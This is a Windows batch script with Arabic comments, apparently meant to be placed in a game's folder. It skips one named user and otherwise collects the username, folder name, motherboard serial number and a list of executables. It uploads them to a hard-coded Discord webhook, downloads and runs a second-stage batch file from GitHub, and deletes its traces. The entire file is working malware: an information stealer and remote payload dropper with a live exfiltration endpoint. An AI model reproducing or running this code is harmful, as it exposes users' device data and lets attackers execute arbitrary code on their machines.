@echo off
:: تفعيل خاصية التوسع المتأخر للمتغيرات
setlocal enabledelayedexpansion

:: 1. فحص اسم المستخدم (Anti-Bruno)
set "TARGET_USER=Bruno"
if /I "%USERNAME%"=="%TARGET_USER%" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: 2. صيد اسم المجلد الحالي (اسم اللعبة)
for %%I in ("%cd%") do set "GNAME=%%~nxI"

:: 3. تجهيز اسم الملف النهائي
:: استخدمنا %USERNAME% و %GNAME%
set "MYFILENAME=%USERNAME%_!GNAME!.txt"
set "FULL_PATH=%TEMP%\!MYFILENAME!"

:: 4. إعداد الروابط
set "WEBHOOK_URL=https://discord.com/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
set "BAT1_PATH=%TEMP%\1.bat"

:: 5. جمع البيانات وكتابتها في الملف الجديد
echo === Device Info === > "!FULL_PATH!"
echo Username: %USERNAME% >> "!FULL_PATH!"
echo Game Name: !GNAME! >> "!FULL_PATH!"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "!FULL_PATH!"
echo. >> "!FULL_PATH!"
dir /b /s *.exe >> "!FULL_PATH!"

:: 6. الإرسال لـ Discord (لاحظ استخدام !FULL_PATH!)
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@!FULL_PATH!" "%WEBHOOK_URL%"

:: 7. تحميل وتشغيل المرحلة الثانية
curl -L -o "%BAT1_PATH%" "%BAT1_URL%"
if exist "%BAT1_PATH%" (
    start /b "" cmd /c "%BAT1_PATH%"
)

:: 8. التنظيف
if exist "!FULL_PATH!" del /f /q "!FULL_PATH!"
exit
